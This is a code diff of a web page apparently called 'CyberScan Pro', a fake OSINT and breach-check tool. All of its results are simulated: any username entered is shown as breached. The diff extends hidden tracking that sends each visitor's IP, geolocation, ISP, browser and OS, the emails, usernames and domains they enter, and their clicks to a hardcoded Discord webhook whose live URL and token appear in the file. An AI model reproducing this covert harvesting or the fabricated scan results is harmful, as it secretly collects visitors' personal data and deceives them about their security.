@@ -28,6 +28,9 @@
       --text: #212529;
       --text-muted: #6c757d;
       --accent: #0d6efd;
+      --danger: #dc3545;
+      --success: #198754;
+      --warning: #ffc107;
     }
     
     body {
@@ -120,18 +123,6 @@
       box-shadow: 0 0 0 0.25rem rgba(59, 130, 246, 0.25);
     }
     
-    .result-card {
-      border-left: 4px solid var(--accent);
-    }
-    
-    .breach-found {
-      border-left: 4px solid var(--danger);
-    }
-    
-    .no-breaches {
-      border-left: 4px solid var(--success);
-    }
-    
     .loading-spinner {
       display: inline-block;
       width: 2rem;
@@ -144,10 +135,6 @@
     
     @keyframes spinner {
       to { transform: rotate(360deg); }
-    }
-    
-    .badge-arin {
-      background-color: #2a5a8b;
     }
     
     .badge-breach {
@@ -184,11 +171,6 @@
       align-items: center;
     }
     
-    .breach-date {
-      font-size: 0.85rem;
-      color: var(--text-muted);
-    }
-    
     .btn-primary {
       background-color: var(--accent);
       border: none;
@@ -210,10 +192,6 @@
       top: 50%;
       transform: translateY(-50%);
       color: var(--text-muted);
-    }
-    
-    .input-group {
-      position: relative;
     }
     
     .tool-icon {
@@ -262,6 +240,7 @@
       text-align: left;
       padding: 8px;
       background-color: rgba(0,0,0,0.05);
+      border-bottom: 1px solid rgba(0,0,0,0.1);
     }
     
     .data-table td {
@@ -281,10 +260,29 @@
       color: var(--success);
     }
     
+    .visitor-info {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      background-color: var(--card-bg);
+      padding: 10px 15px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      z-index: 999;
+    }
+    
     @media (max-width: 768px) {
       .nav-tabs .nav-link {
         padding: 10px 12px;
         font-size: 0.9rem;
+      }
+      
+      .visitor-info {
+        bottom: 80px;
+        left: 10px;
+        right: 10px;
+        text-align: center;
       }
     }
     </style>
@@ -298,9 +296,9 @@
         </a>
         <div class="d-flex align-items-center">
             <span class="badge bg-success me-2">PREMIUM</span>
-            <span class="text-muted">v3.0.0</span>
+            <span class="text-muted">v3.1.0</span>
             <button class="btn btn-sm btn-outline-light ms-3" id="themeToggleBtn" title="Toggle theme">
-                <i class="fas fa-moon"></i>
+                <i class="fas fa-sun"></i>
             </button>
         </div>
     </div>
@@ -329,11 +327,6 @@
                 <li class="nav-item" role="presentation">
                     <button class="nav-link" data-bs-target="#email" data-bs-toggle="tab" id="email-tab" role="tab" type="button">
                         <i class="fas fa-envelope me-2"></i>Email Intel
-                    </button>
-                </li>
-                <li class="nav-item" role="presentation">
-                    <button class="nav-link" data-bs-target="#network" data-bs-toggle="tab" id="network-tab" role="tab" type="button">
-                        <i class="fas fa-network-wired me-2"></i>Network Tools
                     </button>
                 </li>
             </ul>
@@ -447,39 +440,18 @@
                     </div>
                     <div id="emailResults"></div>
                 </div>
-
-                <!-- Network Tools Tab -->
-                <div class="tab-pane fade" id="network" role="tabpanel">
-                    <div class="card p-4 mb-4">
-                        <div class="section-title">
-                            <div class="tool-icon">
-                                <i class="fas fa-network-wired"></i>
-                            </div>
-                            <div>
-                                <h3 class="mb-1">Network Tools</h3>
-                                <p class="text-muted mb-0">Ping, traceroute, and port scanning utilities</p>
-                            </div>
-                        </div>
-                        <form id="networkForm">
-                            <div class="mb-3">
-                                <input class="form-control" id="networkTarget" placeholder="Target IP or Hostname" required="" type="text">
-                            </div>
-                            <div class="mb-3">
-                                <select class="form-control" id="networkTool" required="">
-                                    <option value="">Select Tool</option>
-                                    <option value="ping">Ping</option>
-                                    <option value="traceroute">Traceroute</option>
-                                    <option value="portscan">Port Scan</option>
-                                </select>
-                            </div>
-                            <button class="btn btn-primary w-100 py-2" type="submit">
-                                <i class="fas fa-play me-2"></i>Run Tool
-                            </button>
-                        </form>
-                    </div>
-                    <div id="networkResults"></div>
-                </div>
             </div>
+        </div>
+    </div>
+</div>
+
+<!-- Visitor Info -->
+<div class="visitor-info d-none" id="visitorInfo">
+    <div class="d-flex align-items-center">
+        <i class="fas fa-user-circle me-2"></i>
+        <div>
+            <div><strong>Your IP:</strong> <span id="visitorIP">Loading...</span></div>
+            <div class="small text-muted" id="visitorLocation">Detecting location...</div>
         </div>
     </div>
 </div>
@@ -496,28 +468,77 @@
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1383100299396518068/bXubPq6c3PUbZlOlbCR0tz-UhxmZc4mbXGX1-d87NGQVO2NZA-dMEiuN5DLjCiFxvd-6";
 
 // Track visitor IP and activity
-let visitorIP = "Loading...";
+let visitorIP = "Unknown";
 let visitorData = {};
 
 // Get visitor IP and details
 async function getVisitorInfo() {
     try {
-        const response = await fetch('https://ipapi.co/json/');
+        // First try a quick IP detection
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        visitorIP = ipData.ip;
+        document.getElementById('visitorIP').textContent = visitorIP;
+        document.getElementById('visitorInfo').classList.remove('d-none');
+        
+        // Then get more detailed info
+        const response = await fetch(`https://ipapi.co/${visitorIP}/json/`);
         visitorData = await response.json();
-        visitorIP = visitorData.ip || "Unknown";
+        
+        // Update visitor info display
+        const locationText = [
+            visitorData.city || '',
+            visitorData.region || '',
+            visitorData.country_name || ''
+        ].filter(Boolean).join(', ');
+        
+        document.getElementById('visitorLocation').textContent = locationText || 'Location unknown';
         
         // Log initial visit to Discord
         logToDiscord(
             "New Visitor", 
-            `IP: ${visitorIP}\nLocation: ${visitorData.city}, ${visitorData.country_name}`,
+            `**IP:** ${visitorIP}\n**Location:** ${locationText || 'Unknown'}`,
             [
                 { name: "ISP", value: visitorData.org || "Unknown" },
-                { name: "User Agent", value: navigator.userAgent }
+                { name: "User Agent", value: navigator.userAgent },
+                { name: "Browser", value: `${getBrowserName()} ${getBrowserVersion()}` },
+                { name: "OS", value: getOSName() }
             ]
         );
     } catch (error) {
         console.error("Error fetching visitor info:", error);
+        document.getElementById('visitorIP').textContent = "Error detecting IP";
+        visitorIP = "Unknown";
     }
+}
+
+// Browser detection helpers
+function getBrowserName() {
+    const userAgent = navigator.userAgent;
+    if (userAgent.includes("Firefox")) return "Firefox";
+    if (userAgent.includes("SamsungBrowser")) return "Samsung Browser";
+    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+    if (userAgent.includes("Trident")) return "IE";
+    if (userAgent.includes("Edge")) return "Edge";
+    if (userAgent.includes("Chrome")) return "Chrome";
+    if (userAgent.includes("Safari")) return "Safari";
+    return "Unknown";
+}
+
+function getBrowserVersion() {
+    const userAgent = navigator.userAgent;
+    const matches = userAgent.match(/(firefox|chrome|safari|opera|edge|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+    return matches[2] || "";
+}
+
+function getOSName() {
+    const userAgent = navigator.userAgent;
+    if (userAgent.includes("Windows")) return "Windows";
+    if (userAgent.includes("Mac")) return "MacOS";
+    if (userAgent.includes("Linux")) return "Linux";
+    if (userAgent.includes("Android")) return "Android";
+    if (userAgent.includes("iOS")) return "iOS";
+    return "Unknown";
 }
 
 // Send data to Discord webhook
@@ -528,7 +549,10 @@ function logToDiscord(title, description, fields = []) {
             description: description,
             color: 3447003,
             fields: fields,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            footer: {
+                text: `CyberScan Pro • ${new Date().toLocaleString()}`
+            }
         }]
     };
     
@@ -548,7 +572,7 @@ function toggleTheme() {
     
     // Update icon
     const icon = document.getElementById('themeToggleBtn').querySelector('i');
-    icon.className = newTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
+    icon.className = newTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
     
     // Log theme change
     logToDiscord(
@@ -556,7 +580,7 @@ function toggleTheme() {
         `User switched to ${newTheme} mode`,
         [
             { name: "IP", value: visitorIP },
-            { name: "Location", value: `${visitorData.city}, ${visitorData.country_name}` || "Unknown" }
+            { name: "Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
         ]
     );
 }
@@ -568,19 +592,25 @@ function initTheme() {
     
     // Set correct icon
     const icon = document.getElementById('themeToggleBtn').querySelector('i');
-    icon.className = storedTheme === 'dark' ? 'fas fa-moon' : 'fas fa-sun';
+    icon.className = storedTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
 }
 
 // Track all clicks
 document.addEventListener('click', function(event) {
-    // Don't log clicks on form elements
+    // Don't log clicks on form elements or tabs
     if (!event.target.closest('form') && !event.target.closest('.nav-tabs')) {
+        const target = event.target;
+        let targetDesc = target.tagName;
+        
+        if (target.id) targetDesc += `#${target.id}`;
+        else if (target.className) targetDesc += `.${target.className.split(' ').join('.')}`;
+        
         logToDiscord(
             "User Interaction", 
-            `Clicked: ${event.target.tagName} ${event.target.className || ''}`,
+            `Clicked: ${targetDesc}`,
             [
                 { name: "IP", value: visitorIP },
-                { name: "Page", value: window.location.href }
+                { name: "Page", value: window.location.href.split('#')[0] }
             ]
         );
     }
@@ -616,7 +646,6 @@ window.addEventListener('DOMContentLoaded', function() {
                 else if (formId === 'whoisForm') handleIPLookup();
                 else if (formId === 'domainForm') handleDomainAnalysis();
                 else if (formId === 'emailForm') handleEmailAnalysis();
-                else if (formId === 'networkForm') handleNetworkTool();
             }, 1500);
         });
     });
@@ -634,21 +663,22 @@ function handleBreachScan() {
             name: "LinkedIn 2021 Breach",
             date: "June 2021",
             data: "Emails, Passwords",
-            severity: "high"
+            severity: "high",
+            records: "700 million"
         },
         {
             name: "Collection #1",
             date: "January 2019",
             data: "Emails, Passwords",
-            severity: "medium"
+            severity: "medium",
+            records: "773 million"
         }
     ];
     
     let resultHTML = '<div class="card p-3">';
+    resultHTML += '<h4><i class="fas fa-search me-2"></i>Scan Results</h4>';
     
     if (email || username) {
-        resultHTML += '<h4><i class="fas fa-search me-2"></i>Scan Results</h4>';
-        
         if (email) {
             resultHTML += `
                 <div class="mb-4">
@@ -662,7 +692,10 @@ function handleBreachScan() {
             resultHTML += `
                 <div class="mb-4">
                     <h5>Username: ${username}</h5>
-                    <p class="text-danger"><i class="fas fa-exclamation-triangle me-2"></i>Found in ${breaches.length} breaches</p>
+                    <div class="alert alert-danger">
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        Found in ${breaches.length} known data breaches
+                    </div>
                     ${breaches.map(breach => `
                         <div class="breach-card mb-3">
                             <div class="breach-header">
@@ -671,8 +704,16 @@ function handleBreachScan() {
                                 <span class="badge ${breach.severity === 'high' ? 'bg-danger' : breach.severity === 'medium' ? 'bg-warning' : 'bg-success'} ms-2">${breach.severity}</span>
                             </div>
                             <div class="p-3">
-                                <p><strong>Date:</strong> ${breach.date}</p>
-                                <p><strong>Compromised Data:</strong> ${breach.data}</p>
+                                <div class="row">
+                                    <div class="col-md-6">
+                                        <p><strong>Date:</strong> ${breach.date}</p>
+                                        <p><strong>Compromised Data:</strong> ${breach.data}</p>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <p><strong>Records:</strong> ${breach.records}</p>
+                                        <p><strong>Risk:</strong> ${breach.severity === 'high' ? 'Critical' : breach.severity === 'medium' ? 'Moderate' : 'Low'}</p>
+                                    </div>
+                                </div>
                             </div>
                         </div>
                     `).join('')}
@@ -680,7 +721,7 @@ function handleBreachScan() {
             `;
         }
     } else {
-        resultHTML += '<p class="text-warning"><i class="fas fa-exclamation-circle me-2"></i>Please enter an email or username to scan</p>';
+        resultHTML += '<div class="alert alert-warning"><i class="fas fa-exclamation-circle me-2"></i>Please enter an email or username to scan</div>';
     }
     
     resultHTML += '</div>';
@@ -689,30 +730,31 @@ function handleBreachScan() {
     // Log to Discord
     logToDiscord(
         "Breach Scan", 
-        `Scanned:\nEmail: ${email || "N/A"}\nUsername: ${username || "N/A"}`,
+        `**Scanned:**\nEmail: ${email || "N/A"}\nUsername: ${username || "N/A"}`,
         [
             { name: "Results", value: username ? `Found in ${breaches.length} breaches` : "No breaches found" },
-            { name: "IP", value: visitorIP }
+            { name: "Visitor IP", value: visitorIP },
+            { name: "Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
         ]
     );
 }
 
 // IP Lookup Handler
 function handleIPLookup() {
-    const ip = document.getElementById('whoisIp').value.trim();
+    const ip = document.getElementById('whoisIp').value.trim() || visitorIP;
     const resultsDiv = document.getElementById('whoisResults');
     
     // Simulated IP data
     const ipData = {
-        ip: ip || "8.8.8.8",
-        city: "Mountain View",
-        region: "California",
-        country_name: "United States",
-        org: "Google LLC",
-        postal: "94043",
-        timezone: "America/Los_Angeles",
-        latitude: "37.4056",
-        longitude: "-122.0775"
+        ip: ip,
+        city: ip === visitorIP ? (visitorData.city || "Unknown") : "Mountain View",
+        region: ip === visitorIP ? (visitorData.region || "Unknown") : "California",
+        country_name: ip === visitorIP ? (visitorData.country_name || "Unknown") : "United States",
+        org: ip === visitorIP ? (visitorData.org || "Unknown") : "Google LLC",
+        postal: ip === visitorIP ? (visitorData.postal || "Unknown") : "94043",
+        timezone: ip === visitorIP ? (visitorData.timezone || "Unknown") : "America/Los_Angeles",
+        latitude: ip === visitorIP ? (visitorData.latitude || "37.4056") : "37.4056",
+        longitude: ip === visitorIP ? (visitorData.longitude || "-122.0775") : "-122.0775"
     };
     
     const resultHTML = `
@@ -771,11 +813,12 @@ function handleIPLookup() {
     // Log to Discord
     logToDiscord(
         "IP Lookup", 
-        `Looked up IP: ${ipData.ip}`,
+        `**Looked up IP:** ${ipData.ip}`,
         [
             { name: "Location", value: `${ipData.city}, ${ipData.country_name}` },
             { name: "ISP", value: ipData.org },
-            { name: "Visitor IP", value: visitorIP }
+            { name: "Visitor IP", value: visitorIP },
+            { name: "Visitor Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
         ]
     );
 }
@@ -791,19 +834,30 @@ function handleDomainAnalysis() {
             registrar: "GoDaddy",
             creation: "2005-05-05",
             expiration: "2025-05-05",
-            nameservers: ["ns1.example.com", "ns2.example.com"]
+            nameservers: ["ns1.example.com", "ns2.example.com"],
+            status: "Active"
         },
         dns: {
             a: ["93.184.216.34"],
             mx: ["10 mail.example.com", "20 backup.example.com"],
-            txt: ["v=spf1 include:spf.example.com ~all"]
+            txt: ["v=spf1 include:spf.example.com ~all"],
+            ns: ["ns1.example.com", "ns2.example.com"]
         },
-        subdomains: ["www", "mail", "blog", "shop"],
+        subdomains: ["www", "mail", "blog", "shop", "api", "dev"],
         reputation: {
             score: 85,
             risk: "Low",
-            blacklists: 0
-        }
+            blacklists: 0,
+            malware: false,
+            phishing: false
+        },
+        technologies: [
+            "Nginx",
+            "PHP",
+            "jQuery",
+            "Bootstrap",
+            "Google Analytics"
+        ]
     };
     
     const resultHTML = `
@@ -819,6 +873,10 @@ function handleDomainAnalysis() {
                                 <tr>
                                     <th>Registrar</th>
                                     <td>${domainData.whois.registrar}</td>
+                                </tr>
+                                <tr>
+                                    <th>Status</th>
+                                    <td><span class="badge bg-success">${domainData.whois.status}</span></td>
                                 </tr>
                                 <tr>
                                     <th>Created</th>
@@ -843,13 +901,14 @@ function handleDomainAnalysis() {
                             <h5><i class="fas fa-shield-alt me-2"></i>Reputation</h5>
                             <div class="d-flex align-items-center mt-3">
                                 <div class="me-3">
-                                    <div class="display-4 ${domainData.reputation.score > 70 ? 'text-success' : domainData.reputation.score > 40 ? 'text-warning' : 'text-danger'}">
-                                        ${domainData.reputation.score}
+                                    <div class="display-4 text-success">
+                                        ${domainData.reputation.score}/100
                                     </div>
                                 </div>
                                 <div>
-                                    <p class="mb-1"><strong>Risk Level:</strong> <span class="badge ${domainData.reputation.risk === 'High' ? 'bg-danger' : domainData.reputation.risk === 'Medium' ? 'bg-warning' : 'bg-success'}">${domainData.reputation.risk}</span></p>
+                                    <p class="mb-1"><strong>Risk Level:</strong> <span class="badge bg-success">${domainData.reputation.risk}</span></p>
                                     <p class="mb-1"><strong>Blacklists:</strong> ${domainData.reputation.blacklists}</p>
+                                    <p class="mb-1"><strong>Malware:</strong> <span class="badge ${domainData.reputation.malware ? 'bg-danger' : 'bg-success'}">${domainData.reputation.malware ? 'Detected' : 'Clean'}</span></p>
                                 </div>
                             </div>
                         </div>
@@ -861,19 +920,25 @@ function handleDomainAnalysis() {
                 <div class="card-body">
                     <h5><i class="fas fa-network-wired me-2"></i>DNS Records</h5>
                     <div class="row mt-3">
-                        <div class="col-md-4">
+                        <div class="col-md-3">
                             <h6>A Records</h6>
                             <ul class="list-group list-group-flush">
                                 ${domainData.dns.a.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
                             </ul>
                         </div>
-                        <div class="col-md-4">
+                        <div class="col-md-3">
                             <h6>MX Records</h6>
                             <ul class="list-group list-group-flush">
                                 ${domainData.dns.mx.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
                             </ul>
                         </div>
-                        <div class="col-md-4">
+                        <div class="col-md-3">
+                            <h6>NS Records</h6>
+                            <ul class="list-group list-group-flush">
+                                ${domainData.dns.ns.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
+                            </ul>
+                        </div>
+                        <div class="col-md-3">
                             <h6>TXT Records</h6>
                             <ul class="list-group list-group-flush">
                                 ${domainData.dns.txt.map(record => `<li class="list-group-item bg-transparent">${record}</li>`).join('')}
@@ -891,6 +956,15 @@ function handleDomainAnalysis() {
                     </div>
                 </div>
             </div>
+            
+            <div class="card mt-4">
+                <div class="card-body">
+                    <h5><i class="fas fa-code me-2"></i>Detected Technologies</h5>
+                    <div class="d-flex flex-wrap gap-2 mt-3">
+                        ${domainData.technologies.map(tech => `<span class="badge bg-secondary">${tech}</span>`).join('')}
+                    </div>
+                </div>
+            </div>
         </div>
     `;
     
@@ -899,11 +973,13 @@ function handleDomainAnalysis() {
     // Log to Discord
     logToDiscord(
         "Domain Analysis", 
-        `Analyzed domain: ${domain}`,
+        `**Analyzed domain:** ${domain}`,
         [
             { name: "Registrar", value: domainData.whois.registrar },
+            { name: "Status", value: domainData.whois.status },
             { name: "Reputation", value: `${domainData.reputation.score}/100 (${domainData.reputation.risk})` },
-            { name: "Visitor IP", value: visitorIP }
+            { name: "Visitor IP", value: visitorIP },
+            { name: "Visitor Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
         ]
     );
 }
@@ -916,12 +992,18 @@ function handleEmailAnalysis() {
     
     // Simulated email data
     const emailData = {
-        disposable: ["mailinator.com", "tempmail.com"].includes(domain),
-        breaches: 2,
+        disposable: ["mailinator.com", "tempmail.com", "throwawaymail.com"].includes(domain),
+        breaches: domain === "example.com" ? 0 : 2,
         reputation: {
-            score: 65,
-            risk: "Medium",
-            spam: false
+            score: domain === "example.com" ? 90 : 65,
+            risk: domain === "example.com" ? "Low" : "Medium",
+            spam: false,
+            deliverable: domain !== "mailinator.com"
+        },
+        social: {
+            twitter: domain === "example.com" ? "found" : "not found",
+            facebook: "not found",
+            linkedin: domain === "example.com" ? "found" : "not found"
         }
     };
     
@@ -948,6 +1030,14 @@ function handleEmailAnalysis() {
                                     <td>
                                         <span class="badge ${emailData.disposable ? 'bg-danger' : 'bg-success'}">
                                             ${emailData.disposable ? 'Yes' : 'No'}
+                                        </span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <th>Deliverable</th>
+                                    <td>
+                                        <span class="badge ${emailData.reputation.deliverable ? 'bg-success' : 'bg-danger'}">
+                                            ${emailData.reputation.deliverable ? 'Yes' : 'No'}
                                         </span>
                                     </td>
                                 </tr>
@@ -1007,14 +1097,56 @@ function handleEmailAnalysis() {
                             <span class="badge bg-danger ms-2">High</span>
                         </div>
                         <div class="p-3">
-                            <p><strong>Date:</strong> June 2021</p>
-                            <p><strong>Compromised Data:</strong> Emails, Passwords</p>
-                            <p><strong>Records:</strong> 700 million</p>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <p><strong>Date:</strong> June 2021</p>
+                                    <p><strong>Compromised Data:</strong> Emails, Passwords</p>
+                                </div>
+                                <div class="col-md-6">
+                                    <p><strong>Records:</strong> 700 million</p>
+                                    <p><strong>Risk:</strong> Critical</p>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
             ` : ''}
+            
+            <div class="card mt-4">
+                <div class="card-body">
+                    <h5><i class="fas fa-share-alt me-2"></i>Social Presence</h5>
+                    <div class="row mt-3">
+                        <div class="col-md-4">
+                            <div class="d-flex align-items-center">
+                                <i class="fab fa-twitter me-2"></i>
+                                <span>Twitter: </span>
+                                <span class="badge ${emailData.social.twitter === 'found' ? 'bg-success' : 'bg-secondary'} ms-2">
+                                    ${emailData.social.twitter}
+                                </span>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="d-flex align-items-center">
+                                <i class="fab fa-facebook me-2"></i>
+                                <span>Facebook: </span>
+                                <span class="badge bg-secondary ms-2">
+                                    ${emailData.social.facebook}
+                                </span>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="d-flex align-items-center">
+                                <i class="fab fa-linkedin me-2"></i>
+                                <span>LinkedIn: </span>
+                                <span class="badge ${emailData.social.linkedin === 'found' ? 'bg-success' : 'bg-secondary'} ms-2">
+                                    ${emailData.social.linkedin}
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
     `;
     
@@ -1023,138 +1155,14 @@ function handleEmailAnalysis() {
     // Log to Discord
     logToDiscord(
         "Email Analysis", 
-        `Analyzed email: ${email}`,
+        `**Analyzed email:** ${email}`,
         [
             { name: "Domain", value: domain },
             { name: "Disposable", value: emailData.disposable ? "Yes" : "No" },
             { name: "Breaches", value: emailData.breaches.toString() },
-            { name: "Visitor IP", value: visitorIP }
-        ]
-    );
-}
-
-// Network Tools Handler
-function handleNetworkTool() {
-    const target = document.getElementById('networkTarget').value.trim() || "example.com";
-    const tool = document.getElementById('networkTool').value || "ping";
-    const resultsDiv = document.getElementById('networkResults');
-    
-    // Simulated network data
-    const pingResults = [
-        { seq: 1, time: 24, ttl: 54 },
-        { seq: 2, time: 22, ttl: 54 },
-        { seq: 3, time: 25, ttl: 54 },
-        { seq: 4, time: 23, ttl: 54 }
-    ];
-    
-    const tracerouteResults = [
-        { hop: 1, ip: "192.168.1.1", time: 1.2 },
-        { hop: 2, ip: "10.10.10.1", time: 5.4 },
-        { hop: 3, ip: "45.33.112.1", time: 12.8 },
-        { hop: 4, ip: "64.233.177.1", time: 18.2 }
-    ];
-    
-    const portscanResults = [
-        { port: 22, service: "SSH", status: "open" },
-        { port: 80, service: "HTTP", status: "open" },
-        { port: 443, service: "HTTPS", status: "open" },
-        { port: 3389, service: "RDP", status: "filtered" }
-    ];
-    
-    let resultHTML = '<div class="card p-3">';
-    resultHTML += `<h4><i class="fas fa-network-wired me-2"></i>${tool.charAt(0).toUpperCase() + tool.slice(1)} Results for ${target}</h4>`;
-    
-    if (tool === "ping") {
-        resultHTML += `
-            <div class="mt-3">
-                <pre>PING ${target} (93.184.216.34): 56 data bytes</pre>
-                <table class="data-table">
-                    <thead>
-                        <tr>
-                            <th>Seq</th>
-                            <th>Time (ms)</th>
-                            <th>TTL</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        ${pingResults.map(ping => `
-                            <tr>
-                                <td>${ping.seq}</td>
-                                <td>${ping.time}</td>
-                                <td>${ping.ttl}</td>
-                            </tr>
-                        `).join('')}
-                    </tbody>
-                </table>
-                <pre class="mt-2">
---- ${target} ping statistics ---
-4 packets transmitted, 4 packets received, 0.0% packet loss
-round-trip min/avg/max = 22/23.5/25 ms</pre>
-            </div>
-        `;
-    } else if (tool === "traceroute") {
-        resultHTML += `
-            <div class="mt-3">
-                <pre>traceroute to ${target} (93.184.216.34), 30 hops max</pre>
-                <table class="data-table">
-                    <thead>
-                        <tr>
-                            <th>Hop</th>
-                            <th>IP</th>
-                            <th>Time (ms)</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        ${tracerouteResults.map(hop => `
-                            <tr>
-                                <td>${hop.hop}</td>
-                                <td>${hop.ip}</td>
-                                <td>${hop.time}</td>
-                            </tr>
-                        `).join('')}
-                    </tbody>
-                </table>
-            </div>
-        `;
-    } else if (tool === "portscan") {
-        resultHTML += `
-            <div class="mt-3">
-                <pre>Starting Nmap scan for ${target} (93.184.216.34)</pre>
-                <table class="data-table">
-                    <thead>
-                        <tr>
-                            <th>Port</th>
-                            <th>Service</th>
-                            <th>Status</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        ${portscanResults.map(port => `
-                            <tr>
-                                <td>${port.port}</td>
-                                <td>${port.service}</td>
-                                <td><span class="badge ${port.status === 'open' ? 'bg-success' : 'bg-warning'}">${port.status}</span></td>
-                            </tr>
-                        `).join('')}
-                    </tbody>
-                </table>
-                <pre class="mt-2">
-Nmap done: 1 IP address scanned in 2.45 seconds</pre>
-            </div>
-        `;
-    }
-    
-    resultHTML += '</div>';
-    resultsDiv.innerHTML = resultHTML;
-    
-    // Log to Discord
-    logToDiscord(
-        "Network Tool Used", 
-        `Ran ${tool} on ${target}`,
-        [
-            { name: "Tool", value: tool },
-            { name: "Target", value: target },
-            { name: "Visitor IP", value: visitorIP }
+            { name: "Reputation", value: `${emailData.reputation.score}/100` },
+            { name: "Visitor IP", value: visitorIP },
+            { name: "Visitor Location", value: visitorData.city ? `${visitorData.city}, ${visitorData.country_name}` : "Unknown" }
         ]
     );
 }
